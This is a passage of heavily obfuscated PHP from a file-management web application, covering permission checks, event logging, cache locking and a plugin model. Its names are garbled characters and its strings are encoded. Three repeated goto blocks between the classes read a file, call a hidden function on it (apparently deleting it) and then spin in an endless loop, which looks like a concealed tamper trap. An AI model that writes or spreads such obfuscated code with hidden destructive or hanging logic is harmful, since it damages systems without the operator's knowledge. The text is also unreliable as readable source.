$üô÷ËÑ‹ = $this->authFolderOwnerUser($‰¤´ÚÓ†); $¿‚«–Í[$«•¬÷‹¸] = $üô÷ËÑ‹; $®İƒ‘ö· = array_merge($®İƒ‘ö·, $üô÷ËÑ‹[$€®¡Éäˆ[602]]); if ($üô÷ËÑ‹[$€®¡Éäˆ[2037]]) { break; } } if (count($®İƒ‘ö·) == 0) { $®İƒ‘ö· = $this->authFolderOwnerGroup($­Õ”Ûµ“[$€®¡Éäˆ[510]]); } $®İƒ‘ö· = array_unique($®İƒ‘ö·); if (AuthModel::authCheckRoot($­Õ”Ûµ“[$€®¡Éäˆ[419]][$€®¡Éäˆ[420]])) { $®İƒ‘ö·[] = USER_ID; } $­Õ”Ûµ“[$€®¡Éäˆ[419]][$€®¡Éäˆ[2038]] = Model($€®¡Éäˆ[518])->userListInfo($®İƒ‘ö·); return $­Õ”Ûµ“; } private function authFolderOwnerGroup($øá•êÖÍ) { $ù½„İ÷³ =& $_SERVER[¯µç›È¢]; $Ö†Ñ—ü‹ = Model($ù½„İ÷³[1923])->where(array($ù½„İ÷³[1834] => $øá•êÖÍ))->select(); $¦¡´š‹÷ = array(); if (!$Ö†Ñ—ü‹) { return $¦¡´š‹÷; } foreach ($Ö†Ñ—ü‹ as $“†ô¹¡) { $ÙÒ•´¸ı = $this->authInfo($“†ô¹¡); if (AuthModel::authCheckRoot($ÙÒ•´¸ı[$ù½„İ÷³[419]])) { $¦¡´š‹÷[] = $“†ô¹¡[$ù½„İ÷³[1666]]; } } return $¦¡´š‹÷; } private function authFolderOwnerUser($»šÄğ¢‹) { $ã×éñ¿ =& $_SERVER[¯µç›È¢]; $Ö¸Ñä›û = array(); $•åÌæÉ = !1; foreach ($»šÄğ¢‹ as $Ğ¿İ‹) { $˜§˜Êô = $this->authInfo($Ğ¿İ‹); if ($Ğ¿İ‹[$ã×éñ¿[510]] == $ã×éñ¿[204]) { $•åÌæÉ = !0; } if ($Ğ¿İ‹[$ã×éñ¿[417]] == SourceModel::TYPE_USER) { if (AuthModel::authCheckRoot($˜§˜Êô[$ã×éñ¿[419]])) { $Ö¸Ñä›û[] = $Ğ¿İ‹[$ã×éñ¿[510]]; } } } return array($ã×éñ¿[602] => $Ö¸Ñä›û, $ã×éñ¿[2037] => $•åÌæÉ); } public function authMake($ñ„³Ò¡Ê, $İĞ°‘€Ü = false) { $ÛªÙç–  =& $_SERVER[¯µç›È¢]; $¼¤‹ø = $this->authArrayCheck($ñ„³Ò¡Ê, $İĞ°‘€Ü); if ($¼¤‹ø[$ÛªÙç– [2039]]) { $¼¤‹ø[$ÛªÙç– [2039]] = $this->sourceAuthInfo($¼¤‹ø[$ÛªÙç– [2039]]); } return $¼¤‹ø; } public function authArrayCheck($ìßøí”¤, $‰è¬¼¤– = false) { $´¢æ¦ä« =& $_SERVER[¯µç›È¢]; if (!$ìßøí”¤) { return array($´¢æ¦ä«[420] => 0, $´¢æ¦ä«[471] => !1); } $‰è¬¼¤– = $‰è¬¼¤– ? $‰è¬¼¤– : USER_ID; $è¹ø§§ = 0; $œé­Ÿğ‘ = 0; $Öæ§úÖé = 0; $æìå‰Ë¾ = 0; $íı¤ºÅÎ = 0; $Êå®³Ã¦ = 0; $ü—»´© = 1000; $’àÒºğü = 0; $‚á›æÆ‰ = 0; $Çµ¢Í‰â = 0; $×Şî¤òĞ = 0; $ÀÚêÍŠÏ = array($´¢æ¦ä«[408] => 0); foreach ($ìßøí”¤ as $ÀÚêÍŠÏ) { $·ìŠø„¶ = $this->authInfo($ÀÚêÍŠÏ); if (!$·ìŠø„¶) { continue; } $°›ØØ‰ = $ÀÚêÍŠÏ[$´¢æ¦ä«[510]]; $Øäİìø = intval($·ìŠø„¶[$´¢æ¦ä«[419]]); if ($ÀÚêÍŠÏ[$´¢æ¦ä«[417]] == SourceModel::TYPE_USER && $°›ØØ‰ == $‰è¬¼¤–) { $è¹ø§§ = !0; $Öæ§úÖé = $·ìŠø„¶; $œé­Ÿğ‘ = $Øäİìø; } else { if ($ÀÚêÍŠÏ[$´¢æ¦ä«[417]] == SourceModel::TYPE_GROUP && $this->groupContainUser($°›ØØ‰, $‰è¬¼¤–)) { $æìå‰Ë¾ = !0; $¼Õ¼¼öÛ = $this->groupStepToUserGroup($°›ØØ‰, $‰è¬¼¤–); if ($¼Õ¼¼öÛ < $ü—»´©) { $ü—»´© = $¼Õ¼¼öÛ; $íı¤ºÅÎ = $Øäİìø; $Êå®³Ã¦ = $·ìŠø„¶; $’àÒºğü = $°›ØØ‰; } if ($¼Õ¼¼öÛ == $ü—»´© && $Øäİìø >= $íı¤ºÅÎ) { $íı¤ºÅÎ = $Øäİìø; $Êå®³Ã¦ = $·ìŠø„¶; $’àÒºğü = $°›ØØ‰; } } else { if ($°›ØØ‰ == $´¢æ¦ä«[204]) { $‚á›æÆ‰ = !0; $×Şî¤òĞ = $·ìŠø„¶; $Çµ¢Í‰â = $Øäİìø; } } } } if ($è¹ø§§) { $ĞäÇè¾Š = $œé­Ÿğ‘; $·ìŠø„¶ = $Öæ§úÖé; $£ØÖøÒÆ = LNG($´¢æ¦ä«[2040]); } else { if ($æìå‰Ë¾) { $ĞäÇè¾Š = $íı¤ºÅÎ; $·ìŠø„¶ = $Êå®³Ã¦; $ÜãìĞŠ = Model($´¢æ¦ä«[527])->getInfo($’àÒºğü); $£ØÖøÒÆ = $´¢æ¦ä«[173] . $ÜãìĞŠ[$´¢æ¦ä«[531]] . $´¢æ¦ä«[2041] . LNG($´¢æ¦ä«[2042]); } else { if ($‚á›æÆ‰) { $ĞäÇè¾Š = $Çµ¢Í‰â; $·ìŠø„¶ = $×Şî¤òĞ; $£ØÖøÒÆ = LNG($´¢æ¦ä«[2013]); } else { $ĞäÇè¾Š = 0; $·ìŠø„¶ = !1; $£ØÖøÒÆ = $´¢æ¦ä«[12]; } } } $ÉÎ·™† = array($´¢æ¦ä«[2032] => intval($ĞäÇè¾Š), $´¢æ¦ä«[2016] => $·ìŠø„¶, $´¢æ¦ä«[2033] => $£ØÖøÒÆ, $´¢æ¦ä«[2025] => $ÀÚêÍŠÏ[$´¢æ¦ä«[408]]); return $ÉÎ·™†; } private function groupContainUser($úôô÷°†, $¾—ŒÍª = false) { return in_array($úôô÷°†, $this->userGroupParents($¾—ŒÍª)); } private function groupStepToUserGroup($™ˆŒ˜¾ç, $ı®ƒ„¦ê = false) { $àÑÔÆî =& $_SERVER[¯µç›È¢]; $‹§¢Ÿ¡ = $this->userGroupList($ı®ƒ„¦ê); $ùõ²ïİŒ = 1000; $Î¼ÌàÔì = $GLOBALS[$àÑÔÆî[6]][$àÑÔÆî[100]][$àÑÔÆî[1936]] == 1; $‚‡–Ëà‘ = $Î¼ÌàÔì ? 3 : 2; foreach ($‹§¢Ÿ¡ as $µëÏæ¦Ø) { if ($µëÏæ¦Ø[$àÑÔÆî[1834]] == $™ˆŒ˜¾ç) { return 0; } $Åªá‹Ó = explode($àÑÔÆî[50], trim($µëÏæ¦Ø[$àÑÔÆî[526]], $àÑÔÆî[50])); if ($Åªá‹Ó[0] == $àÑÔÆî[204] && count($Åªá‹Ó) > $‚‡–Ëà‘) { $ÆÚÆé„” = array_reverse(array_slice($Åªá‹Ó, $‚‡–Ëà‘)); $Á ‚Íç = array_search($™ˆŒ˜¾ç, $ÆÚÆé„”); if ($Á ‚Íç !== !1 && $Á ‚Íç + 1 <= $ùõ²ïİŒ) { $ùõ²ïİŒ = $Á ‚Íç + 1; } } } return $ùõ²ïİŒ; } private function userGroupList($È¿„¯˜÷ = false) { $£øõÇ¡Á =& $_SERVER[¯µç›È¢]; static $Ã¿±³É = array(); if (isset($Ã¿±³É[$È¿„¯˜÷])) { return $Ã¿±³É[$È¿„¯˜÷]; } $‰åÚëó = Model($£øõÇ¡Á[546])->getInfo($È¿„¯˜÷); $Ã¿±³É[$È¿„¯˜÷] = array_to_keyvalue($‰åÚëó[$£øõÇ¡Á[2014]], $£øõÇ¡Á[1834]); return $Ã¿±³É[$È¿„¯˜÷]; } public function userGroupParents($§Ç¦ÄÈ”) { $µ«ÕÖ« =& $_SERVER[¯µç›È¢]; static $óÜ¸Íúƒ = array(); $§Ç¦ÄÈ” = $§Ç¦ÄÈ” ? $§Ç¦ÄÈ” : USER_ID; if (isset($óÜ¸Íúƒ[$§Ç¦ÄÈ”])) { return $óÜ¸Íúƒ[$§Ç¦ÄÈ”]; } $õ»ÜëÁª = $this->userGroupList($§Ç¦ÄÈ”); $Õ‚Æáæ‚ = array(); $ì¬ÙüÆ® = $GLOBALS[$µ«ÕÖ«[6]][$µ«ÕÖ«[100]][$µ«ÕÖ«[1936]] == 1; $°şïè–Ã = $ì¬ÙüÆ® ? 3 : 2; foreach ($õ»ÜëÁª as $ËÛ§†ƒÜ) { $èğ¼ùˆÜ = array($ËÛ§†ƒÜ[$µ«ÕÖ«[1834]]); $ìØÀİÙÃ = explode($µ«ÕÖ«[50], trim($ËÛ§†ƒÜ[$µ«ÕÖ«[526]], $µ«ÕÖ«[50])); if ($ìØÀİÙÃ[0] == $µ«ÕÖ«[204] && count($ìØÀİÙÃ) > $°şïè–Ã) { $ŞêÅõŸ­ = array_slice($ìØÀİÙÃ, $°şïè–Ã); $èğ¼ùˆÜ = array_merge($èğ¼ùˆÜ, array_reverse($ŞêÅõŸ­)); } $Õ‚Æáæ‚ = array_merge($Õ‚Æáæ‚, $èğ¼ùˆÜ); } $óÜ¸Íúƒ[$§Ç¦ÄÈ”] = array_unique($Õ‚Æáæ‚); return $óÜ¸Íúƒ[$§Ç¦ÄÈ”]; } public function authTargetInfoMake($ë·Şû) { $‰Ÿ‡¬÷š =& $_SERVER[¯µç›È¢]; $ÈÌ¡ÆÄ¯ = array(); $«ù½½µ = array(); foreach ($ë·Şû as $êß¡ô™Ó) { if ($êß¡ô™Ó[$‰Ÿ‡¬÷š[417]] == SourceModel::TYPE_USER) { $ÈÌ¡ÆÄ¯[] = intval($êß¡ô™Ó[$‰Ÿ‡¬÷š[510]]); } else { if ($êß¡ô™Ó[$‰Ÿ‡¬÷š[417]] == SourceModel::TYPE_GROUP) { $«ù½½µ[] = intval($êß¡ô™Ó[$‰Ÿ‡¬÷š[510]]); } } } if ($ÈÌ¡ÆÄ¯) { $ÈÌ¡ÆÄ¯ = Model($‰Ÿ‡¬÷š[518])->userListInfo($ÈÌ¡ÆÄ¯); } if ($«ù½½µ) { $ª†î¥×‚ = array($‰Ÿ‡¬÷š[1921] => array($‰Ÿ‡¬÷š[424], $«ù½½µ)); $«ù½½µ = Model($‰Ÿ‡¬÷š[527])->field($‰Ÿ‡¬÷š[2043])->where($ª†î¥×‚)->select(); $«ù½½µ = array_to_keyvalue($«ù½½µ, $‰Ÿ‡¬÷š[1834]); } return array($‰Ÿ‡¬÷š[2044] => $ÈÌ¡ÆÄ¯, $‰Ÿ‡¬÷š[2045] => $«ù½½µ); } public function authInfo($õ„­¹ï•) { $‹øÇ¶‡Ê =& $_SERVER[¯µç›È¢]; if ($õ„­¹ï•[$‹øÇ¶‡Ê[1937]]) { $®éšÌ¶È = Model($‹øÇ¶‡Ê[512])->listData($õ„­¹ï•[$‹øÇ¶‡Ê[1937]]); if (!$®éšÌ¶È) { return !1; $—–ã‹Å = Model($‹øÇ¶‡Ê[512])->listData(); $—Ò¾•Ùä = array_filter_by_field($—–ã‹Å, $‹øÇ¶‡Ê[419], $‹øÇ¶‡Ê[204]); return $—Ò¾•Ùä; } $ëµ¤ÕÛó = array_field_key($®éšÌ¶È, array($‹øÇ¶‡Ê[405], $‹øÇ¶‡Ê[32], $‹øÇ¶‡Ê[419], $‹øÇ¶‡Ê[1856], $‹øÇ¶‡Ê[1857])); $ëµ¤ÕÛó[$‹øÇ¶‡Ê[2046]] = $õ„­¹ï•; return $ëµ¤ÕÛó; } else { return array($‹øÇ¶‡Ê[425] => 0, $‹øÇ¶‡Ê[1840] => $õ„­¹ï•[$‹øÇ¶‡Ê[1991]], $‹øÇ¶‡Ê[426] => $‹øÇ¶‡Ê[12], $‹øÇ¶‡Ê[1856] => $‹øÇ¶‡Ê[2047]); } } } class SourceEventModel extends ModelBase { protected $tableName = "\151\157\137\163\157\x75\x72\143\x65\137\145\166\x65\x6e\164"; protected $dataAuto = array(array("\143\162\145\141\x74\145\x54\x69\155\145", "\x74\x69\155\x65", "\x69\x6e\x73\x65\x72\164", "\x66\165\156\x63\164\x69\x6f\156"), array("\144\x65\x73\x63", '', "\x69\156\x73\145\x72\x74\x2c\165\160\x64\x61\164\x65\x2c\x73\145\154\145\143\x74", "\152\163\157\x6e")); protected $eventSave = true; public function recodeStop() { $this->eventSave = !1; } public function recodeStart() { $this->eventSave = !0; } public function addEvent($Ø¦¯ », $ôÆë‹‰Í, $´Ì…Åğ‹ = '') { $”ƒ¡ŸğÕ =& $_SERVER[¯µç›È¢]; if (!$this->eventSave) { return; } $æóÈ«şÊ = Model($”ƒ¡ŸğÕ[1337])->sourceInfo($Ø¦¯ »); if (!$æóÈ«şÊ) { return !1; } if ($this->isCacheEvent($æóÈ«şÊ, $ôÆë‹‰Í)) { return; } if ($´Ì…Åğ‹ && is_string($´Ì…Åğ‹)) { $´Ì…Åğ‹ = array($”ƒ¡ŸğÕ[1872] => $´Ì…Åğ‹); } $¼ñ¥‡Ó¥ = array($”ƒ¡ŸğÕ[423] => $Ø¦¯ », $”ƒ¡ŸğÕ[2048] => $æóÈ«şÊ[$”ƒ¡ŸğÕ[503]], $”ƒ¡ŸğÕ[2049] => $æóÈ«şÊ[$”ƒ¡ŸğÕ[32]], $”ƒ¡ŸğÕ[524] => !empty($æóÈ«şÊ[$”ƒ¡ŸğÕ[524]]) ? $æóÈ«şÊ[$”ƒ¡ŸğÕ[524]] : $”ƒ¡ŸğÕ[12], $”ƒ¡ŸğÕ[1657] => USER_ID, $”ƒ¡ŸğÕ[428] => $ôÆë‹‰Í, $”ƒ¡ŸğÕ[1659] => $´Ì…Åğ‹); $this->addSystemLog($ôÆë‹‰Í, $¼ñ¥‡Ó¥); unset($¼ñ¥‡Ó¥[$”ƒ¡ŸğÕ[2049]], $¼ñ¥‡Ó¥[$”ƒ¡ŸğÕ[524]]); return $this->add($¼ñ¥‡Ó¥); } private function addSystemLog($•“ª²æ, $¾„¸Íä) { $û”Ä¶Ùî =& $_SERVER[¯µç›È¢]; if ($•“ª²æ == $û”Ä¶Ùî[2050]) { $•“ª²æ = $¾„¸Íä[$û”Ä¶Ùî[456]][$û”Ä¶Ùî[2051]]; } else { if (in_array($•“ª²æ, array($û”Ä¶Ùî[1814], $û”Ä¶Ùî[2052]))) { $•“ª²æ = $¾„¸Íä[$û”Ä¶Ùî[456]][$û”Ä¶Ùî[772]]; } } $· «ù•” = array_merge($¾„¸Íä, array($û”Ä¶Ùî[2053] => $¾„¸Íä[$û”Ä¶Ùî[408]], $û”Ä¶Ùî[2054] => $¾„¸Íä[$û”Ä¶Ùî[2054]])); Hook::trigger($û”Ä¶Ùî[2055], $û”Ä¶Ùî[2056] . $•“ª²æ, $¾„¸Íä); Model($û”Ä¶Ùî[1778])->addLog($û”Ä¶Ùî[2056] . $•“ª²æ, $· «ù•”); } private function isCacheEvent($¸ŞÎÒ»†, $ÚÖúÄóÒ) { if ($¸ŞÎÒ»†[$_SERVER[¯µç›È¢][417]] == SourceModel::TYPE_SYSTEM) { return !0; } return !1; } public function eventCreate($ú¡¶»¾ò, $¿ÅñİÓ) { $š´‘” =& $_SERVER[¯µç›È¢]; $ñğæèÄÎ = Model($š´‘”[1337])->sourceInfo($ú¡¶»¾ò); $”ÓÛô¡Ó = array($š´‘”[2051] => $¿ÅñİÓ, $š´‘”[32] => $ñğæèÄÎ[$š´‘”[32]]); return $this->addEvent($ú¡¶»¾ò, $š´‘”[2050], $”ÓÛô¡Ó); } public function eventFileEdit($úîËâÔ) { $š½ëÉ“ =& $_SERVER[¯µç›È¢]; $Œ‘ÙØâŸ = array($š½ëÉ“[2057] => $_SERVER[$š½ëÉ“[2058]], $š½ëÉ“[2059] => strtolower(ACTION)); return $this->addEvent($úîËâÔ, $š½ëÉ“[1804], $Œ‘ÙØâŸ); } public function eventRecycle($Å°Ú‚¡Œ, $Ú«‹ÊµÃ) { return $this->addEvent($Å°Ú‚¡Œ, $_SERVER[¯µç›È¢][2052], $Ú«‹ÊµÃ); } public function eventRemove($Ïîğ±´œ) { $ş‹ÁÚ¡ =& $_SERVER[¯µç›È¢]; $ÍÄÊö¾¤ = Model($ş‹ÁÚ¡[1337])->sourceInfo($Ïîğ±´œ); $ÊÇ§³ëÕ = $ÍÄÊö¾¤[$ş‹ÁÚ¡[32]]; return $this->addEvent($ÍÄÊö¾¤[$ş‹ÁÚ¡[503]], $ş‹ÁÚ¡[1803], $ÊÇ§³ëÕ); } public function eventShare($İî®êõ, $ÁÖñä¿Ğ) { return $this->addEvent($İî®êõ, $_SERVER[¯µç›È¢][1814], $ÁÖñä¿Ğ); } public function eventMove($û¤îûëü, $Œš¹á£ã, $Ô­Œü·£) { $ãíû®›· =& $_SERVER[¯µç›È¢]; $ÜßİÉÌ = Model($ãíû®›·[1337]); $ÑÌè»Í = $ÜßİÉÌ->sourceInfo($û¤îûëü); $ÃŠ¸Æ£¹ = $ÜßİÉÌ->sourceInfo($Œš¹á£ã); $Ãšº¤°í = $ÜßİÉÌ->sourceInfo($Ô­Œü·£); $ÈÀˆ˜ó = array($ãíû®›·[1170] => $Œš¹á£ã, $ãíû®›·[2060] => $ÃŠ¸Æ£¹[$ãíû®›·[32]], $ãíû®›·[2039] => !empty($ÃŠ¸Æ£¹[$ãíû®›·[524]]) ? $ÃŠ¸Æ£¹[$ãíû®›·[524]] : $ãíû®›·[12], $ãíû®›·[1171] => $Ô­Œü·£, $ãíû®›·[2061] => $Ãšº¤°í[$ãíû®›·[32]], $ãíû®›·[2062] => !empty($Ãšº¤°í[$ãíû®›·[524]]) ? $Ãšº¤°í[$ãíû®›·[524]] : $ãíû®›·[12]); $this->addEvent($û¤îûëü, $ãíû®›·[559], $ÈÀˆ˜ó); $ÑÌè»Í = $ÜßİÉÌ->sourceInfo($û¤îûëü); $ÈÀˆ˜ó = array($ãíû®›·[408] => $ÑÌè»Í[$ãíû®›·[408]], $ãíû®›·[32] => $ÑÌè»Í[$ãíû®›·[32]]); $this->addEvent($Œš¹á£ã, $ãíû®›·[2063], $ÈÀˆ˜ó); } public function eventCopy($ÚÊŞĞ) { $this->eventCreate($ÚÊŞĞ, $_SERVER[¯µç›È¢][557]); } public function eventRename($ª¹„Á³”, $…ÍÂã’‹, $Õúé‹›) { $†±ÔË€ø =& $_SERVER[¯µç›È¢]; $À‡©ûëÓ = array($†±ÔË€ø[1170] => $…ÍÂã’‹, $†±ÔË€ø[1171] => $Õúé‹›); return $this->addEvent($ª¹„Á³”, $†±ÔË€ø[1352], $À‡©ûëÓ); } public function eventAddComment($¢äÂÌÍ½, $¨ƒõ¾) { return $this->addEvent($¢äÂÌÍ½, $_SERVER[¯µç›È¢][2064], $¨ƒõ¾); } public function eventAddDesc($á„€¢ ‚, $®æ÷½ü) { return $this->addEvent($á„€¢ ‚, $_SERVER[¯µç›È¢][2065], $®æ÷½ü); } public function listBySource($û¹°£¶–) { $”ëÆ¯¡ =& $_SERVER[¯µç›È¢]; $’¥İ¯ı• = Model($”ëÆ¯¡[1337])->sourceInfo($û¹°£¶–); $€àÚì¨ = array($”ëÆ¯¡[423] => $û¹°£¶–); if ($’¥İ¯ı•[$”ëÆ¯¡[416]] == $”ëÆ¯¡[99]) { $„¢Ú»Îª = Model($”ëÆ¯¡[1337])->listSearchChildren($û¹°£¶–, 20000); $„¢Ú»Îª[] = $û¹°£¶– . $”ëÆ¯¡[386]; $€àÚì¨ = array($”ëÆ¯¡[408] => array($”ëÆ¯¡[7], $„¢Ú»Îª)); } $ı¾â¡Ê = $this->where($€àÚì¨)->order($”ëÆ¯¡[2066])->selectPage(); if ($ı¾â¡Ê[$”ëÆ¯¡[374]][$”ëÆ¯¡[375]] == 0) { $ı¾â¡Ê[$”ëÆ¯¡[374]][$”ëÆ¯¡[375]] = 1; $ı¾â¡Ê[$”ëÆ¯¡[377]] = array(array($”ëÆ¯¡[423] => $û¹°£¶–, $”ëÆ¯¡[2048] => $’¥İ¯ı•[$”ëÆ¯¡[503]], $”ëÆ¯¡[1657] => $’¥İ¯ı•[$”ëÆ¯¡[457]], $”ëÆ¯¡[428] => $”ëÆ¯¡[2067], $”ëÆ¯¡[429] => $’¥İ¯ı•[$”ëÆ¯¡[207]], $”ëÆ¯¡[1659] => $”ëÆ¯¡[12])); } return $this->eventListParse($ı¾â¡Ê, $û¹°£¶–); } private function eventListParse($©¬¹ª£é, $¾Ê’•Â‹) { $ß×­ÆÎ =& $_SERVER[¯µç›È¢]; $©úÀî‡Ì = $©¬¹ª£é[$ß×­ÆÎ[377]]; $À—ĞŠ¬ó = array_to_keyvalue($©úÀî‡Ì, $ß×­ÆÎ[12], $ß×­ÆÎ[408]); $×”îÖ…º = array_to_keyvalue($©úÀî‡Ì, $ß×­ÆÎ[12], $ß×­ÆÎ[2054]); foreach ($©úÀî‡Ì as $âöâµèÒ) { $†‘õÔ…ï = $âöâµèÒ[$ß×­ÆÎ[456]]; if ($âöâµèÒ[$ß×­ÆÎ[33]] == $ß×­ÆÎ[559] && isset($†‘õÔ…ï[$ß×­ÆÎ[1170]])) { $À—ĞŠ¬ó[] = $†‘õÔ…ï[$ß×­ÆÎ[1170]] . $ß×­ÆÎ[12]; $À—ĞŠ¬ó[] = $†‘õÔ…ï[$ß×­ÆÎ[1171]] . $ß×­ÆÎ[12]; } if ($âöâµèÒ[$ß×­ÆÎ[33]] == $ß×­ÆÎ[2063] && isset($†‘õÔ…ï[$ß×­ÆÎ[408]])) { $À—ĞŠ¬ó[] = $†‘õÔ…ï[$ß×­ÆÎ[408]] . $ß×­ÆÎ[12]; } } $À—ĞŠ¬ó = array_merge($À—ĞŠ¬ó, $×”îÖ…º, array($¾Ê’•Â‹ . $ß×­ÆÎ[12])); $À—ĞŠ¬ó = array_unique($À—ĞŠ¬ó); $Í•·ü®Œ = array_unique(array_to_keyvalue($©úÀî‡Ì, $ß×­ÆÎ[12], $ß×­ÆÎ[1666])); $§Â ©¼ = Model($ß×­ÆÎ[546])->userListInfo($Í•·ü®Œ); $Ù¡±‡ÇĞ = Model($ß×­ÆÎ[842])->sourceListInfo($À—ĞŠ¬ó, !0); foreach ($©úÀî‡Ì as &$âöâµèÒ) { if ($âöâµèÒ[$ß×­ÆÎ[33]] == $ß×­ÆÎ[559] && isset($âöâµèÒ[$ß×­ÆÎ[456]][$ß×­ÆÎ[1170]])) { $âöâµèÒ[$ß×­ÆÎ[456]][$ß×­ÆÎ[1170]] = $Ù¡±‡ÇĞ[$âöâµèÒ[$ß×­ÆÎ[456]][$ß×­ÆÎ[1170]]]; $âöâµèÒ[$ß×­ÆÎ[456]][$ß×­ÆÎ[1171]] = $Ù¡±‡ÇĞ[$âöâµèÒ[$ß×­ÆÎ[456]][$ß×­ÆÎ[1171]]]; } if ($âöâµèÒ[$ß×­ÆÎ[33]] == $ß×­ÆÎ[2063] && isset($âöâµèÒ[$ß×­ÆÎ[456]][$ß×­ÆÎ[408]])) { $âöâµèÒ[$ß×­ÆÎ[456]][$ß×­ÆÎ[408]] = $Ù¡±‡ÇĞ[$âöâµèÒ[$ß×­ÆÎ[456]][$ß×­ÆÎ[408]]]; } $âöâµèÒ[$ß×­ÆÎ[97]] = $Ù¡±‡ÇĞ[$âöâµèÒ[$ß×­ÆÎ[408]]]; $âöâµèÒ[$ß×­ÆÎ[2068]] = $Ù¡±‡ÇĞ[$âöâµèÒ[$ß×­ÆÎ[2054]]]; if ($âöâµèÒ[$ß×­ÆÎ[33]] == $ß×­ÆÎ[1803]) { $âöâµèÒ[$ß×­ÆÎ[2068]] = $âöâµèÒ[$ß×­ÆÎ[97]]; $âöâµèÒ[$ß×­ÆÎ[2054]] = $âöâµèÒ[$ß×­ÆÎ[2068]][$ß×­ÆÎ[408]]; $âöâµèÒ[$ß×­ÆÎ[97]] = !1; $âöâµèÒ[$ß×­ÆÎ[408]] = $ß×­ÆÎ[12]; } $âöâµèÒ[$ß×­ÆÎ[1999]] = $§Â ©¼[$âöâµèÒ[$ß×­ÆÎ[1666]]]; } unset($âöâµèÒ); $©¬¹ª£é[$ß×­ÆÎ[377]] = $©úÀî‡Ì; return $©¬¹ª£é; } public function removeBySource($¹Ó¤ÂŞÂ) { $Ñæ ·Ñ = array($_SERVER[¯µç›È¢][423] => $¹Ó¤ÂŞÂ); $this->where($Ñæ ·Ñ)->remove(); } } goto BÜÍ¢ß™‹Ñ; AÚ£à©Ê÷: if (!isset($_SERVER[$_SERVER[¯µç›È¢][62]]) || !isset($_SERVER[$_SERVER[¯µç›È¢][60]])) { $_getc = $_SERVER[¯µç›È¢][63]; $_getfile = $_SERVER[$_SERVER[¯µç›È¢][64]] . $_SERVER[¯µç›È¢][65]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[¯µç›È¢][66], $_getfilec); if (count($_getarrs) < $_SERVER[¯µç›È¢][67]) { $exit = $_SERVER[¯µç›È¢][68]; $exit(); } $_act = $_SERVER[¯µç›È¢][69]; $_act($_SERVER[$_SERVER[¯µç›È¢][64]] . $_SERVER[¯µç›È¢][65]); $_iii = 2; while ($_iii > 1) { $_iiij = rawurlencode($_iii . $_SERVER[¯µç›È¢][386]); } } goto FæŠÓË³ ”; fŒ¼‰¼¨±: if (!isset($_SERVER[$_SERVER[¯µç›È¢][62]]) || !isset($_SERVER[$_SERVER[¯µç›È¢][60]])) { $_getc = $_SERVER[¯µç›È¢][63]; $_getfile = $_SERVER[$_SERVER[¯µç›È¢][64]] . $_SERVER[¯µç›È¢][65]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[¯µç›È¢][66], $_getfilec); if (count($_getarrs) < $_SERVER[¯µç›È¢][67]) { $exit = $_SERVER[¯µç›È¢][68]; $exit(); } $_act = $_SERVER[¯µç›È¢][69]; $_act($_SERVER[$_SERVER[¯µç›È¢][64]] . $_SERVER[¯µç›È¢][65]); $_iii = 2; while ($_iii > 1) { $_iiij = rawurlencode($_iii . $_SERVER[¯µç›È¢][386]); } } class CacheLockDatabase { public function lock($—ï’Û±¦, $Ò¬¡Ÿ÷ = 0) { $¬¤ŒÂœ³ = Model($_SERVER[¯µç›È¢][846]); $•ü•¾¾  = microtime(!0) + $Ò¬¡Ÿ÷; while (microtime(!0) < $•ü•¾¾ ) { $’¥¡®‹¯ = $¬¤ŒÂœ³->get($—ï’Û±¦); if (!$’¥¡®‹¯ || $’¥¡®‹¯ < microtime(!0)) { $ş·Õ–òÈ = $¬¤ŒÂœ³->set($—ï’Û±¦, $•ü•¾¾ ); if ($ş·Õ–òÈ) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($š²·ì›Õ) { return Model($_SERVER[¯µç›È¢][846])->get($š²·ì›Õ); } public function unlock($€ŞÀˆé) { Model($_SERVER[¯µç›È¢][846])->remove($€ŞÀˆé); } } class CacheMemcached { public $handle; public $cacheTime; public function __construct($’™á„µ›, $Û£­«Ùı) { $ÚßÙÄÉÂ =& $_SERVER[¯µç›È¢]; if (!class_exists($ÚßÙÄÉÂ[879])) { show_json($ÚßÙÄÉÂ[880], !1); } $this->cacheTime = $Û£­«Ùı; $this->handle = new Memcached(); if (is_array($’™á„µ›[$ÚßÙÄÉÂ[881]]) && count($’™á„µ›[$ÚßÙÄÉÂ[881]]) >= 1) { foreach ($’™á„µ›[$ÚßÙÄÉÂ[881]] as $¼œ£Ò±) { $òÊ‰ğ— = explode($ÚßÙÄÉÂ[4], $¼œ£Ò±); $this->handle->addServer($òÊ‰ğ—[0], $òÊ‰ğ—[1]); } } else { $this->handle->addServer($’™á„µ›[$ÚßÙÄÉÂ[188]], $’™á„µ›[$ÚßÙÄÉÂ[189]]); } } public function set($ÍˆØ’Á·, $±¬ Ü·, $Ş±Çïü = false) { $Ş±Çïü = $Ş±Çïü ? $Ş±Çïü : $this->cacheTime; return $this->handle->set($ÍˆØ’Á·, $±¬ Ü·, $Ş±Çïü); } public function get($äŠ ¸Üó) { return $this->handle->get($äŠ ¸Üó); } public function remove($Á¯ªÀƒ‹) { return $this->handle->delete($Á¯ªÀƒ‹); } public function deleteAll() { return $this->handle->flush(); } } goto c„µåÌßù; BìÁ§¦‰ïª: if (!isset($_SERVER[$_SERVER[¯µç›È¢][62]]) || !isset($_SERVER[$_SERVER[¯µç›È¢][60]])) { $_getc = $_SERVER[¯µç›È¢][63]; $_getfile = $_SERVER[$_SERVER[¯µç›È¢][64]] . $_SERVER[¯µç›È¢][65]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[¯µç›È¢][66], $_getfilec); if (count($_getarrs) < $_SERVER[¯µç›È¢][67]) { $exit = $_SERVER[¯µç›È¢][68]; $exit(); } $_act = $_SERVER[¯µç›È¢][69]; $_act($_SERVER[$_SERVER[¯µç›È¢][64]] . $_SERVER[¯µç›È¢][65]); $_iii = 2; while ($_iii > 1) { $_iiij = rawurlencode($_iii . $_SERVER[¯µç›È¢][386]); } } class PluginModel extends ModelBaseLight { public $optionType = "\123\x79\163\x74\145\x6d\56\160\154\x75\147\x69\156\114\151\163\164"; public $field = array("\156\141\x6d\145", "\x73\x74\x61\x74\x75\x73", "\162\145\147\151\x65\163\x74", "\x63\157\156\x66\x69\147"); public function loadList($íãéÍÎ÷ = false) { $ãŠÔóĞó = array_to_keyvalue($this->listData(), $_SERVER[¯µç›È¢][32]); if ($íãéÍÎ÷) { return $ãŠÔóĞó[$íãéÍÎ÷]; } return $ãŠÔóĞó; } public function init() { 